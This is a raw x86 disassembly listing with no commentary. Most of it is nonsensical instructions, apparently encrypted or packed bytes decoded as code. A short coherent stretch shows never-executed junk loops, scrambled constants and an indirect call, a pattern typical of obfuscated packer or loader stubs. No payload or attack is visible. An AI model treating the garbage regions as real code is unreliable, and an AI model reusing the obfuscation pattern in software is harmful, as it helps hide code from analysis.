  41f15e:	retf   0x9c2
  41f161:	pop    es
  41f162:	sub    ebx,edi
  41f164:	and    ebp,DWORD PTR [edx-0x33427d88]
  41f16a:	in     al,dx
  41f16b:	popa   
  41f16c:	push   0xffffffac
  41f16e:	cdq    
  41f16f:	arpl   WORD PTR [edi-0x4c8283ef],bp
  41f175:	aaa    
  41f176:	mov    bh,0x31
  41f178:	mov    dl,0xc9
  41f17a:	out    0x4b,al
  41f17c:	cmp    al,0x13
  41f17e:	or     eax,0x4c5ee37a
  41f183:	rcl    BYTE PTR [ebx+edi*2-0x59],cl
  41f187:	push   0xfffffffd
  41f189:	sbb    BYTE PTR [ebp+eax*4-0x71f0feee],ah
  41f190:	pop    ebp
  41f191:	ds and cl,cl
  41f194:	xchg   edx,eax
  41f195:	scas   al,BYTE PTR es:[edi]
  41f196:	jl     0x41f181
  41f198:	loop   0x41f180
  41f19a:	or     eax,0x9cf4f69d
  41f19f:	enter  0x672d,0xe3
  41f1a3:	or     ebp,esi
  41f1a5:	inc    eax
  41f1a6:	int    0x89
  41f1a8:	ret    0x664d
  41f1ab:	push   ebp
  41f1ac:	gs clc 
  41f1ae:	inc    ecx
  41f1af:	call   0xb985:0xf2bfc0ed
  41f1b6:	adc    edi,DWORD PTR [edx-0xe571be7]
  41f1bc:	(bad)
  41f1bf:	outs   dx,BYTE PTR ds:[esi]
  41f1c0:	enter  0x3284,0xe6
  41f1c4:	std    
  41f1c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1c6:	in     al,dx
  41f1c7:	jns    0x41f1d2
  41f1c9:	(bad)  
  41f1ca:	adc    edi,ebp
  41f1cc:	sbb    BYTE PTR [edi],ah
  41f1ce:	mov    dl,0x7f
  41f1d0:	mov    ?,WORD PTR [edx-0x1c]
  41f1d3:	mov    bh,0x99
  41f1d5:	ins    DWORD PTR es:[edi],dx
  41f1d6:	pop    ebp
  41f1d7:	mov    dh,0x5a
  41f1d9:	jg     0x41f22e
  41f1db:	imul   esp,DWORD PTR [esi],0xffffff85
  41f1de:	and    ch,BYTE PTR [edx+0x65e3497c]
  41f1e4:	xor    edi,ebp
  41f1e6:	mov    esp,0x2f797ab
  41f1eb:	outs   dx,DWORD PTR ds:[esi]
  41f1ec:	call   0x1a31:0x9492c3e8
  41f1f3:	aam    0x4b
  41f1f5:	adc    ecx,0x811df72a
  41f1fb:	out    dx,eax
  41f1fc:	aaa    
  41f1fd:	xchg   edi,eax
  41f1fe:	push   edi
  41f1ff:	scas   al,BYTE PTR es:[edi]
  41f200:	pop    ds
  41f201:	mov    ah,al
  41f203:	sbb    DWORD PTR [eax],0x3d85a94d
  41f209:	sbb    DWORD PTR [ecx+0x3c],eax
  41f20c:	dec    esp
  41f20d:	jmp    0x41f22c
  41f20f:	mov    dh,0x7c
  41f211:	sbb    edi,DWORD PTR [esi+0x6f2d6fba]
  41f217:	and    eax,0xa4f3c795
  41f21c:	jg     0x41f208
  41f21e:	aas    
  41f21f:	push   ebx
  41f220:	in     eax,dx
  41f221:	cli    
  41f222:	sar    esp,cl
  41f224:	and    esi,DWORD PTR [edx+edx*1-0x4cb0faad]
  41f22b:	pop    ds
  41f22c:	mov    ds:0xd2ba1d4c,al
  41f231:	lods   eax,DWORD PTR ds:[esi]
  41f232:	jae    0x41f227
  41f234:	ftst   
  41f236:	int    0xed
  41f238:	das    
  41f239:	fisttp WORD PTR [ebp+0x40]
  41f23c:	mov    dl,0x95
  41f23e:	xchg   ebx,eax
  41f23f:	(bad)  
  41f240:	neg    bh
  41f242:	xor    edx,DWORD PTR [eax]
  41f244:	out    0xf9,al
  41f246:	xor    eax,0x38695d52
  41f24b:	int    0x39
  41f24d:	div    BYTE PTR [ecx-0x2d45cfc8]
  41f253:	ficomp WORD PTR [edi+0x5]
  41f256:	or     al,0x96
  41f258:	outs   dx,DWORD PTR ds:[esi]
  41f259:	or     DWORD PTR [ecx-0x21],ebx
  41f25c:	ss jno 0x41f1f7
  41f25f:	push   ds
  41f260:	daa    
  41f261:	icebp  
  41f262:	push   ebx
  41f263:	and    DWORD PTR ds:0x786830fc,edx
  41f269:	(bad)  
  41f26a:	stos   BYTE PTR es:[edi],al
  41f26b:	and    cl,BYTE PTR [edx+0x55d7ed24]
  41f271:	scas   eax,DWORD PTR es:[edi]
  41f272:	push   esi
  41f273:	ror    DWORD PTR [edi+0x78],cl
  41f276:	mov    ebx,DWORD PTR [ebx+0xe]
  41f279:	sub    BYTE PTR [edx+0x4b3667f5],cl
  41f27f:	dec    ebx
  41f280:	test   BYTE PTR [ecx],bl
  41f282:	xchg   edx,eax
  41f283:	jb     0x41f2a2
  41f285:	arpl   ax,dx
  41f287:	daa    
  41f288:	push   si
  41f28a:	mov    esi,0xf6977165
  41f28f:	xor    DWORD PTR [ebx-0x30],ecx
  41f292:	fild   WORD PTR gs:[esi+eiz*2-0x54]
  41f297:	push   ebx
  41f298:	jmp    0x596a7728
  41f29d:	lock enter 0x144b,0xee
  41f2a2:	gs test eax,0x771b04c
  41f2a8:	inc    esi
  41f2a9:	loopne 0x41f28e
  41f2ab:	stc    
  41f2ac:	sub    BYTE PTR [ebx+ebp*2+0x3a],bl
  41f2b0:	or     DWORD PTR [edi+0xa3cd6f4],ebx
  41f2b6:	and    DWORD PTR [eax],esp
  41f2b8:	mov    ch,cl
  41f2ba:	call   FWORD PTR [ebx-0x792ff46d]
  41f2c0:	in     al,0xc1
  41f2c2:	xchg   esp,eax
  41f2c3:	pop    ds
  41f2c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2c5:	bound  esp,QWORD PTR [edi-0x538cb2de]
  41f2cb:	sub    al,0xf5
  41f2cd:	inc    ecx
  41f2ce:	es iret 
  41f2d0:	cmp    BYTE PTR [esi+0x68],ch
  41f2d3:	jg     0x41f290
  41f2d5:	hlt    
  41f2d6:	out    0xe7,al
  41f2d8:	sbb    DWORD PTR [edx],eax
  41f2da:	xor    BYTE PTR [edx+0x58],al
  41f2dd:	popf   
  41f2de:	loope  0x41f282
  41f2e0:	pop    ebp
  41f2e1:	int    0x1f
  41f2e3:	aam    0xd
  41f2e5:	stos   DWORD PTR es:[edi],eax
  41f2e6:	inc    edx
  41f2e7:	leave  
  41f2e8:	out    dx,al
  41f2e9:	jle    0x41f316
  41f2eb:	pop    ecx
  41f2ec:	test   al,0x14
  41f2ee:	xor    al,BYTE PTR [ebp+0x3bdca0f6]
  41f2f4:	pop    ss
  41f2f5:	sbb    eax,0xc3f15b6a
  41f2fa:	sbb    edi,DWORD PTR [ebx+0x61]
  41f2fd:	push   edi
  41f2fe:	shl    ebx,0x72
  41f301:	stc    
  41f302:	ss test eax,0x94c69e61
  41f308:	jb     0x41f2cc
  41f30a:	(bad)  
  41f30b:	jp     0x41f353
  41f30d:	pop    ss
  41f30e:	in     al,dx
  41f30f:	pop    ds
  41f310:	and    BYTE PTR [edx],dl
  41f312:	repnz cwde 
  41f314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f315:	sub    DWORD PTR [edi-0x1fb6e247],0x9a646177
  41f31f:	add    ebp,DWORD PTR ds:0xb88d0613
  41f325:	jne    0x41f372
  41f327:	outs   dx,DWORD PTR ds:[esi]
  41f328:	dec    eax
  41f329:	lea    edx,ds:0xcb1d386f
  41f32f:	clc    
  41f330:	(bad)  
  41f331:	cs mov edi,0x50b9b279
  41f337:	mov    eax,0x7f61855d
  41f33c:	gs loope 0x41f30c
  41f33f:	inc    ecx
  41f340:	test   eax,0x87f0b2c3
  41f345:	adc    ah,BYTE PTR [edi+edi*2-0x6d]
  41f349:	pop    ebx
  41f34a:	inc    DWORD PTR [ecx-0x28]
  41f34d:	ins    DWORD PTR es:[edi],dx
  41f34e:	adc    al,al
  41f350:	call   0xf7b0d441
  41f355:	popf   
  41f356:	test   al,al
  41f358:	dec    ebx
  41f359:	pop    esp
  41f35a:	shl    DWORD PTR [bx+di+0x1],0xe0
  41f35f:	push   eax
  41f360:	out    0x78,al
  41f362:	call   DWORD PTR [ebx+0x24f4a89]
  41f368:	das    
  41f369:	test   al,0x4f
  41f36b:	cmp    DWORD PTR [esi-0x6f5e9fc1],0x35
  41f372:	aam    0x29
  41f374:	ret    
  41f375:	cmp    DWORD PTR [edi+0x5233b69b],esp
  41f37b:	cmp    BYTE PTR [edi+0x5c],dh
  41f37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f37f:	lods   al,BYTE PTR ds:[esi]
  41f380:	fsubr  DWORD PTR [edi+0xb]
  41f383:	mov    DWORD PTR [ecx],esp
  41f385:	jb     0x41f3c7
  41f387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f388:	cmp    cl,BYTE PTR [ecx-0x36e83ae9]
  41f38e:	adc    eax,0x55258425
  41f393:	ficom  DWORD PTR [esi-0x1b]
  41f396:	loop   0x41f391
  41f398:	imul   edi,DWORD PTR [edx+0x1d2937e1],0x4ae8ecda
  41f3a2:	(bad)  
  41f3a3:	test   BYTE PTR [ebp-0x6b],0x99
  41f3a7:	xlat   BYTE PTR ds:[ebx]
  41f3a8:	(bad)  
  41f3a9:	hlt    
  41f3aa:	gs or  al,0x79
  41f3ad:	(bad)  
  41f3ae:	xlat   BYTE PTR ds:[ebx]
  41f3af:	es aad 0x36
  41f3b2:	ins    BYTE PTR es:[edi],dx
  41f3b3:	rcl    BYTE PTR [esi+0x62],0x7b
  41f3b7:	xchg   ebx,eax
  41f3b8:	rol    BYTE PTR [ebx-0x62],cl
  41f3bb:	add    edi,esi
  41f3bd:	cmp    DWORD PTR [ecx-0x7407ba75],0x55
  41f3c4:	in     al,dx
  41f3c5:	push   DWORD PTR [ebp-0x28]
  41f3c8:	mov    DWORD PTR [edx+0x1],eax
  41f3cb:	mov    eax,ds:0x4262c4
  41f3d0:	push   DWORD PTR [eax]
  41f3d2:	push   DWORD PTR ds:0x426528
  41f3d8:	push   DWORD PTR ds:0x4262cc
  41f3de:	push   DWORD PTR ds:0x426508
  41f3e4:	mov    eax,DWORD PTR [ebp-0x14]
  41f3e7:	push   DWORD PTR ds:0x426594
  41f3ed:	push   0xbd8d95b3
  41f3f2:	push   ecx
  41f3f3:	call   eax
  41f3f5:	pop    edi
  41f3f6:	pop    esi
  41f3f7:	pop    ebx
  41f3f8:	leave  
  41f3f9:	ret    
  41f3fa:	push   ebp
  41f3fb:	mov    ebp,esp
  41f3fd:	sub    esp,0x3c
  41f400:	mov    DWORD PTR ds:0x4267f0,0x1f
  41f40a:	cmp    DWORD PTR ds:0x4267f0,0x0
  41f411:	je     0x41f453
  41f417:	cmp    DWORD PTR ds:0x4267f0,0x23
  41f41e:	jb     0x41f453
  41f424:	jmp    0x41f441
  41f429:	push   0x426840
  41f42e:	push   DWORD PTR [ebp-0x28]
  41f431:	push   0x4267e0
  41f436:	push   0x2c5b
  41f43b:	call   DWORD PTR ds:0x425790
  41f441:	mov    edx,DWORD PTR ds:0x4267f0
  41f447:	dec    edx
  41f448:	mov    DWORD PTR ds:0x4267f0,edx
  41f44e:	jmp    0x41f40a
  41f453:	mov    DWORD PTR [ebp-0x10],0xbd8e95b0
  41f45a:	xor    ecx,edx
  41f45c:	lea    eax,[ebp+0x1c]
  41f45f:	and    DWORD PTR ds:0x426858,0x4b5d
  41f469:	mov    DWORD PTR [ebp-0x4],eax
  41f46c:	adc    DWORD PTR ds:0x4267f0,ecx
  41f472:	mov    DWORD PTR [ebp-0x8],0xbd8d95b0
  41f479:	lea    eax,[ebp-0x8]
  41f47c:	xor    ecx,ecx
  41f47e:	mov    DWORD PTR [ebp-0x14],eax
  41f481:	mov    eax,DWORD PTR [ebp-0x8]
  41f484:	and    DWORD PTR ds:0x426828,0x0
  41f48e:	mov    edx,DWORD PTR ds:0x426828
  41f494:	inc    edx
  41f495:	mov    DWORD PTR ds:0x426828,edx
  41f49b:	cmp    DWORD PTR ds:0x426828,0x1c
  41f4a2:	ja     0x41f4d0
  41f4a8:	jmp    0x41f4c3
  41f4ad:	push   0x4267ec
  41f4b2:	push   DWORD PTR [ebp-0x10]
  41f4b5:	push   0x2b65
  41f4ba:	push   DWORD PTR [ebp-0x10]
  41f4bd:	call   DWORD PTR ds:0x425794
  41f4c3:	cmp    DWORD PTR ds:0x426828,0x15
  41f4ca:	jb     0x41f48e
  41f4d0:	mov    edx,DWORD PTR [ebp-0x14]
  41f4d3:	mov    DWORD PTR ds:0x426838,0x13
  41f4dd:	cmp    DWORD PTR ds:0x426838,0x0
  41f4e4:	je     0x41f51e
  41f4ea:	cmp    DWORD PTR ds:0x426838,0x19
  41f4f1:	jl     0x41f51e
  41f4f7:	jmp    0x41f50a
  41f4fc:	push   0x7fd3
  41f501:	push   DWORD PTR [ebp-0x14]
  41f504:	call   DWORD PTR ds:0x425798
  41f50a:	xor    ecx,ecx
  41f50c:	add    ecx,DWORD PTR ds:0x426838
  41f512:	dec    ecx
  41f513:	mov    DWORD PTR ds:0x426838,ecx
  41f519:	jmp    0x41f4dd
  41f51e:	mov    ecx,0x751018b5
  41f523:	and    DWORD PTR ds:0x426850,0x284a
  41f52d:	push   ebx
  41f52e:	adc    DWORD PTR ds:0x426830,0xbc1
  41f538:	xor    eax,ecx
  41f53a:	sub    DWORD PTR ds:0x4267d8,0x426848
  41f544:	push   esi
  41f545:	add    eax,0x376272fb
  41f54a:	push   edi
  41f54b:	mov    DWORD PTR [edx],eax
  41f54d:	xor    eax,eax
  41f54f:	mov    eax,ds:0x4262c0
  41f554:	mov    edx,DWORD PTR [ebp-0x4]
  41f557:	mov    DWORD PTR ds:0x426814,0x13
  41f561:	cmp    DWORD PTR ds:0x426814,0x0
  41f568:	je     0x41f59d
  41f56e:	cmp    DWORD PTR ds:0x426814,0x16
  41f575:	jle    0x41f59d
  41f57b:	jmp    0x41f58b
  41f580:	push   0x25d6
  41f585:	call   DWORD PTR ds:0x4257b4
  41f58b:	mov    esi,DWORD PTR ds:0x426814
  41f591:	dec    esi
  41f592:	mov    DWORD PTR ds:0x426814,esi
  41f598:	jmp    0x41f561
  41f59d:	mov    eax,DWORD PTR [eax]
  41f59f:	add    eax,DWORD PTR [edx]
  41f5a1:	mov    esi,0x56424137
  41f5a6:	sub    edi,0x7e83
  41f5ac:	mov    DWORD PTR [ebp-0xc],eax
  41f5af:	and    DWORD PTR ds:0x42681c,0x0
  41f5b9:	mov    edi,DWORD PTR ds:0x42681c
  41f5bf:	inc    edi
  41f5c0:	mov    DWORD PTR ds:0x42681c,edi
  41f5c6:	cmp    DWORD PTR ds:0x42681c,0x12
  41f5cd:	ja     0x41f60a
  41f5d3:	jmp    0x41f5e3
  41f5d8:	push   0x34fa
  41f5dd:	call   DWORD PTR ds:0x42579c
  41f5e3:	cmp    DWORD PTR ds:0x42681c,0x11
  41f5ea:	jne    0x41f5fd
  41f5f0:	mov    edi,DWORD PTR ds:0x42681c
  41f5f6:	inc    edi
  41f5f7:	mov    DWORD PTR ds:0x42681c,edi
  41f5fd:	cmp    DWORD PTR ds:0x42681c,0x1f
  41f604:	jb     0x41f5b9
  41f60a:	mov    eax,DWORD PTR [ebp+0x8]
  41f60d:	jmp    0x421986
  41f612:	cmp    ch,BYTE PTR [edx-0x6e]
  41f615:	xor    DWORD PTR [edx-0x6d8fa78f],esi
  41f61b:	ins    DWORD PTR es:[edi],dx
  41f61c:	or     DWORD PTR [ecx],ebp
  41f61e:	dec    ecx
  41f61f:	xor    eax,0x4036d957
  41f624:	jp     0x41f6a1
  41f626:	xlat   BYTE PTR ds:[ebx]
  41f627:	cwde   
  41f628:	jnp    0x41f6a5
  41f62a:	rol    DWORD PTR [ecx+ecx*1+0x2d15c89a],1
  41f631:	fcomi  st,st(4)
  41f633:	inc    eax
  41f634:	jbe    0x41f5d9
  41f636:	das    
  41f637:	ins    DWORD PTR es:[edi],dx
  41f638:	in     al,0xd1
  41f63a:	inc    edi
  41f63b:	pop    ebx
  41f63c:	mov    edx,0x7786175a
  41f641:	or     eax,DWORD PTR [eax+0x49b7eb22]
  41f647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f648:	xchg   edi,eax
  41f649:	push   edi
  41f64a:	xchg   BYTE PTR [edx-0xc9526aa],bh
  41f650:	push   edi
  41f651:	imul   edx,DWORD PTR ds:[edi+ecx*1+0x378472e0],0x2b
  41f65a:	push   ds
  41f65b:	call   0x4927218f
  41f660:	mov    al,0xb
  41f662:	dec    edx
  41f663:	outs   dx,BYTE PTR ds:[esi]
  41f664:	mov    ds:0x8cb4644a,al
  41f669:	sbb    BYTE PTR [edx],dl
  41f66b:	sub    dl,BYTE PTR [edi]
  41f66d:	and    esp,DWORD PTR [ebp+edi*1+0x47a20d29]
  41f674:	mov    ds:0x11882568,eax
  41f679:	sub    DWORD PTR [edi],ecx
  41f67b:	pop    ds
  41f67c:	adc    DWORD PTR [esi+0x69],0x9f80ed56
  41f683:	out    dx,eax
  41f684:	std    
  41f685:	sbb    al,0x96
  41f687:	xor    al,0x3a
  41f689:	ins    DWORD PTR es:[edi],dx
  41f68a:	or     DWORD PTR [esp+ebp*1-0x2e95f5b7],esp
  41f691:	push   esi
  41f692:	xor    eax,0x400b01dd
  41f697:	js     0x41f63b
  41f699:	jne    0x41f700
  41f69b:	mov    ebp,0xef372391
  41f6a0:	push   esp
  41f6a1:	mov    edi,0xb17fb726
  41f6a6:	or     DWORD PTR [edi],edi
  41f6a8:	leave  
  41f6a9:	ins    DWORD PTR es:[edi],dx
  41f6aa:	mov    cl,0x72
  41f6ac:	mov    edx,0xdfe0fff1
  41f6b1:	pop    eax
  41f6b2:	inc    esp
  41f6b3:	lea    ebx,[ebx-0x65aef17d]
  41f6b9:	add    DWORD PTR [ebx],edi
  41f6bb:	sbb    DWORD PTR [ebp+0x138a2307],esp
  41f6c1:	and    bh,BYTE PTR [eax+0x22]
  41f6c4:	imul   edi,DWORD PTR [esi+0x5d],0x3cbf252
  41f6cb:	aas    
  41f6cc:	sub    eax,0x86faaa03
  41f6d1:	outs   dx,DWORD PTR ds:[esi]
  41f6d2:	push   0x72e72a43
  41f6d7:	aas    
  41f6d8:	or     al,0xd7
  41f6da:	sbb    ebp,ebp
  41f6dc:	mov    esi,0x60359a62
  41f6e1:	not    ah
  41f6e3:	sub    al,0x3d
  41f6e5:	sahf   
  41f6e6:	cmp    al,0xcf
  41f6e8:	inc    edx
  41f6e9:	pop    esi
  41f6ea:	inc    esi
  41f6eb:	add    DWORD PTR [edx-0x65790ee9],ebp
  41f6f1:	popa   
  41f6f2:	call   0x2bdf:0xb1c25d33
  41f6f9:	int    0x3f
  41f6fb:	in     eax,0x2
  41f6fd:	das    
  41f6fe:	(bad)  
  41f700:	xlat   BYTE PTR ds:[ebx]
  41f701:	jmp    0x41f740
  41f703:	in     al,dx
  41f704:	mov    al,0x49
  41f706:	mov    dh,0x2e
  41f708:	jmp    0x9e4ee1db
  41f70d:	or     esi,DWORD PTR [eax]
  41f70f:	mov    edx,0x6858cfa8
  41f714:	stos   DWORD PTR es:[edi],eax
  41f715:	pushw  cs
  41f717:	xchg   ecx,eax
  41f718:	ins    DWORD PTR es:[edi],dx
  41f719:	add    esp,esp
  41f71b:	imul   DWORD PTR [ebx]
  41f71d:	jno    0x41f74b
  41f71f:	mov    bl,0xed
  41f721:	test   DWORD PTR [edi+0x7c6fdad8],eax
  41f727:	mov    WORD PTR [edx],ss
  41f729:	xchg   BYTE PTR [ebx],al
  41f72b:	fsub   QWORD PTR [ecx]
  41f72d:	and    ebx,DWORD PTR [edx+0x10]
  41f730:	jl     0x41f78d
  41f732:	pop    eax
  41f733:	xchg   BYTE PTR ds:0x11903e6c,ah
  41f739:	xlat   BYTE PTR ds:[ebx]
  41f73a:	out    0x32,eax
  41f73c:	fs and al,0x55
  41f73f:	cld    
  41f740:	xlat   BYTE PTR ds:[ebx]
  41f741:	shl    DWORD PTR [esp+eax*8],0x33
  41f745:	and    al,0x79
  41f747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f748:	and    ebx,DWORD PTR [ebp-0x5a]
  41f74b:	and    DWORD PTR [edx+0x1a],esp
  41f74e:	imul   edi,edi,0x27354e07
  41f754:	and    DWORD PTR fs:[edi],edi
  41f757:	popf   
  41f758:	xchg   edx,eax
  41f759:	repz xchg edx,eax
  41f75b:	(bad)  
  41f75c:	dec    edx
  41f75d:	jb     0x41f769
  41f75f:	adc    cl,0x30
  41f762:	retf   0x1893
  41f765:	xchg   ebx,eax
  41f766:	inc    ebx
  41f767:	xchg   BYTE PTR [eax],al
  41f769:	cmp    DWORD PTR [ebx+0x4e],0xffffff96
  41f76d:	imul   ebx,DWORD PTR [ebp-0x38a5fda5],0x56
  41f774:	cmp    BYTE PTR [edi],al
  41f776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f777:	ror    DWORD PTR [edi-0x7b],cl
  41f77a:	push   ebp
  41f77b:	retf   0xc923
  41f77e:	mov    bl,0x3f
  41f780:	inc    esi
  41f781:	ss pop es
  41f783:	sbb    DWORD PTR [ebx+0x2a],ebp
  41f786:	xchg   DWORD PTR [esi],ecx
  41f788:	inc    esp
  41f789:	mov    ch,0x18
  41f78b:	or     eax,0x94fdca89
  41f790:	or     bl,dh
  41f792:	sahf   
  41f793:	(bad)  
  41f794:	daa    
  41f795:	mov    esp,0xdc9dc9e6
  41f79a:	push   esi
  41f79b:	jmp    DWORD PTR [ecx-0x57]
  41f79e:	repz jp 0x41f79a
  41f7a1:	das    
  41f7a2:	popf   
  41f7a3:	inc    esp
  41f7a4:	cdq    
  41f7a5:	into   
  41f7a6:	dec    edx
  41f7a7:	std    
  41f7a8:	dec    eax
  41f7a9:	cs or  ch,bh
  41f7ac:	enter  0xeceb,0x9
  41f7b0:	mov    ecx,0x66959a61
  41f7b5:	pushf  
  41f7b6:	and    eax,eax
  41f7b8:	sbb    ah,0xc6
  41f7bb:	jle    0x41f762
  41f7bd:	je     0x41f7a1
  41f7bf:	call   0x1d1c:0x200d4d87
  41f7c6:	cmc    
  41f7c7:	and    bl,dh
  41f7c9:	es push ebx
  41f7cb:	cs push es
  41f7cd:	test   BYTE PTR [ecx+esi*8+0x23d850e2],cl
  41f7d4:	cwde   
  41f7d5:	ror    DWORD PTR [ebx+eax*4-0x7c457d64],0xc8
  41f7dd:	mov    ?,edi
  41f7df:	add    ecx,DWORD PTR ds:0x44acf5d7
  41f7e5:	lock jmp 0x41f782
  41f7e8:	bound  esi,QWORD PTR ds:0x4a19e68c
  41f7ee:	dec    eax
  41f7ef:	xchg   edx,eax
  41f7f0:	xor    ch,BYTE PTR [esi+eax*2]
  41f7f3:	mov    ecx,0xc520ea39
  41f7f8:	cmp    eax,ebp
  41f7fa:	add    eax,0x5a0b01bd
  41f7ff:	daa    
  41f800:	pop    edi
  41f801:	pushf  
  41f802:	inc    eax
  41f803:	fnstsw WORD PTR [edx+0x7d8cc1b6]
  41f809:	es jo  0x41f884
  41f80c:	rol    BYTE PTR [esi+eax*4],cl
  41f80f:	xor    edx,DWORD PTR [edi+0x5c4424d]
  41f815:	sbb    BYTE PTR [esi+0x797be8b8],bl
  41f81b:	fisttp DWORD PTR [ebx]
  41f81d:	jge    0x41f7c9
  41f81f:	push   edx
  41f820:	add    al,0xf4
  41f822:	popf   
  41f823:	mov    al,0x57
  41f825:	fadd   st(4),st
  41f827:	push   edx
  41f828:	lock mov edx,0x7af5d30e
  41f82e:	mov    edx,0x560f521e
  41f833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f834:	dec    esp
  41f835:	add    edx,ebp
  41f837:	js     0x41f7c8
  41f839:	dec    ebx
  41f83a:	inc    eax
  41f83b:	or     dh,BYTE PTR [eax-0xf]
  41f83e:	ins    BYTE PTR es:[edi],dx
  41f83f:	cld    
  41f840:	lock sbb al,0x15
  41f843:	out    0x39,al
  41f845:	retf   0xd101
  41f848:	test   al,0x33
  41f84a:	mov    edi,0x773025ef
  41f84f:	xor    al,0x9a
  41f851:	xchg   ebx,eax
  41f852:	mov    cl,0x20
  41f854:	mov    bh,0x10
  41f856:	je     0x41f82d
  41f858:	outs   dx,DWORD PTR ds:[esi]
  41f859:	sbb    esp,DWORD PTR [edx-0x5e]
  41f85c:	mov    WORD PTR [ecx],?
  41f85e:	add    cl,al
  41f860:	nop
  41f861:	out    0x78,al
  41f863:	pop    ds
  41f864:	addr16 xchg ebx,edi
  41f867:	shl    DWORD PTR [eax+0x50],1
  41f86a:	push   ebx
  41f86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f86c:	cmp    ch,BYTE PTR [edx+0x7e]
  41f86f:	pop    ebx
  41f870:	jl     0x41f8d3
  41f872:	pop    ebp
  41f873:	sub    dh,0x31
  41f876:	fdiv   st(0),st
  41f878:	mov    ds:0x78eb585f,al
  41f87d:	dec    ebx
  41f87e:	add    ebx,esp
  41f880:	(bad)  
  41f881:	outs   dx,DWORD PTR ds:[esi]
  41f882:	mov    ebx,0x3ad0621c
  41f887:	into   
  41f888:	sar    DWORD PTR [edx-0x3b],cl
  41f88b:	call   0x216165e9
  41f890:	push   edx
  41f891:	nop
  41f892:	adc    DWORD PTR [edx-0x60],0xfffffff5
  41f896:	pop    edi
  41f897:	pop    ebx
  41f898:	jge    0x41f909
  41f89a:	add    al,0x56
  41f89c:	lods   eax,DWORD PTR ds:[esi]
  41f89d:	mov    cl,0x8
  41f89f:	sbb    BYTE PTR [ecx],dh
  41f8a1:	cdq    
  41f8a2:	(bad)  
  41f8a3:	in     al,dx
  41f8a4:	add    al,0xdf
  41f8a6:	push   ss
  41f8a7:	sbb    al,0x7b
  41f8a9:	sbb    eax,0x5ee7695d
  41f8ae:	ror    DWORD PTR [edi+0x66],cl
  41f8b1:	fstp   DWORD PTR [edx-0x1f]
  41f8b4:	test   esi,eax
  41f8b6:	outs   dx,BYTE PTR ds:[esi]
  41f8b7:	mov    fs,WORD PTR [esi+0x636b9366]
  41f8bd:	(bad)  
  41f8be:	mov    ah,0x88
  41f8c0:	dec    ebp
  41f8c1:	cwde   
  41f8c2:	out    0x76,eax
  41f8c4:	jno    0x41f8b2
  41f8c6:	mov    ?,WORD PTR [edi-0x36726474]
  41f8cc:	and    bh,al
  41f8ce:	or     eax,esi
  41f8d0:	mov    BYTE PTR [esi+ebx*2-0x58e8b288],ch
  41f8d7:	xor    cl,BYTE PTR [eax-0x79]
  41f8da:	nop
  41f8db:	cli    
  41f8dc:	loop   0x41f86e
  41f8de:	sbb    DWORD PTR [esi],0x883d15d9
  41f8e4:	das    
  41f8e5:	pusha  
  41f8e6:	cmc    
  41f8e7:	and    DWORD PTR [edx],edi
  41f8e9:	iret   
  41f8ea:	into   
  41f8eb:	in     eax,0x80
  41f8ed:	dec    ecx
  41f8ee:	loope  0x41f91d
  41f8f0:	addr16 shl bh,1
  41f8f3:	ins    DWORD PTR es:[edi],dx
  41f8f4:	cmp    ebx,ecx
  41f8f6:	cmp    bl,bh
  41f8f8:	and    BYTE PTR [edx-0x7e4e3e01],bh
  41f8fe:	mov    dl,0x62
  41f900:	push   esi
  41f901:	out    dx,eax
  41f902:	xchg   edx,eax
  41f903:	pop    edx
  41f904:	adc    eax,0x7393fa08
  41f909:	dec    edx
  41f90a:	cld    
  41f90b:	popa   
  41f90c:	cmp    DWORD PTR [ebp+0x6a],0xffffffc7
  41f910:	cwde   
  41f911:	xchg   BYTE PTR [esi+eax*4+0x22],al
  41f915:	push   edx
  41f916:	xor    edi,edi
  41f918:	add    dl,BYTE PTR [ebp+0x6064a0a3]
  41f91e:	xchg   ebp,eax
  41f91f:	lahf   
  41f920:	add    BYTE PTR [eax+0x1a6a4eb7],0xbc
  41f927:	dec    eax
  41f928:	xor    eax,0x592559b9
  41f92d:	js     0x41f9a7
  41f92f:	pushf  
  41f930:	mov    WORD PTR [edx+0x4d93503d],ss
  41f936:	dec    edx
  41f937:	imul   ebp,DWORD PTR [eax],0xac66d0a4
  41f93d:	mov    WORD PTR ds:[esi-0x10],bx
  41f942:	inc    esp
  41f943:	pop    ss
  41f944:	sbb    DWORD PTR [esi],ecx
  41f946:	repz test BYTE PTR [ebx],al
  41f949:	(bad)  
  41f94a:	ficomp DWORD PTR [esp+esi*8]
  41f94d:	sahf   
  41f94e:	add    eax,0xafebe83d
  41f953:	jbe    0x41f8f6
  41f955:	loopne 0x41f8ed
  41f957:	ret    
  41f958:	sub    DWORD PTR [edi-0x60896114],0xd
  41f95f:	outs   dx,DWORD PTR ds:[esi]
  41f960:	mov    al,ds:0xc19dfb7f
  41f965:	popa   
  41f966:	(bad)  
  41f967:	push   edi
  41f968:	(bad)  
  41f969:	in     eax,0x2e
  41f96b:	adc    ecx,DWORD PTR [ecx-0x18ffd6b5]
  41f971:	das    
  41f972:	outs   dx,BYTE PTR ds:[esi]
  41f973:	mov    cl,0xc8
  41f975:	xchg   esi,eax
  41f976:	cmp    dl,BYTE PTR [ecx]
  41f978:	loope  0x41f937
  41f97a:	jmp    0x41f996
  41f97c:	and    DWORD PTR ss:[ebx],edi
  41f97f:	pop    ss
  41f980:	sbb    dl,ch
  41f982:	cmp    dh,0xb5
  41f985:	jl     0x41f917
  41f987:	add    eax,0x4e5a9746
  41f98c:	jl     0x41f9a5
  41f98e:	mov    al,0x5d
  41f990:	loopne 0x41f9d5
  41f992:	mov    ecx,0x67bdb061
  41f997:	add    al,0x58
  41f999:	fisub  WORD PTR [eax+0x6d]
  41f99c:	sbb    BYTE PTR [ebp+0x62d2f6d2],cl
  41f9a2:	jo     0x41f939
  41f9a4:	clc    
  41f9a5:	push   esp
  41f9a6:	xchg   edx,eax
  41f9a7:	inc    esi
  41f9a8:	or     DWORD PTR [ebx-0x3b],ebp
